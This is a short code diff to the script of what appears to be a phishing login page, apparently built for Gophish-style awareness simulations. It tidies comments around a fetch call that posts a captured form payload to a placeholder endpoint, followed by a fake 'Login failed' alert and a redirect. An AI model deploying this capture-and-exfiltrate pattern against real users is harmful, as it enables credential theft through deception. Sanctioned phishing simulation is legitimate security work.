@@ -82,18 +82,16 @@
         timestamp: new Date().toISOString(),
       };
 
-      // OPTIONAL: send to Gophish or webhook URL
+      // Send to webhook (optional - replace with your own endpoint)
       fetch("https://your-logging-endpoint.com/track", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload),
       }).catch(err => console.warn("Log failed", err));
 
-      // Redirect after submission
-      // Redirect after submission
-	alert("Login failed. Please contact your administrator.");
-	window.location.href = "alert.html";
-
+      // Simulate login failure and redirect
+      alert("Login failed. Please contact your administrator.");
+      window.location.href = "alert.html";
     });
   </script>
 </body>
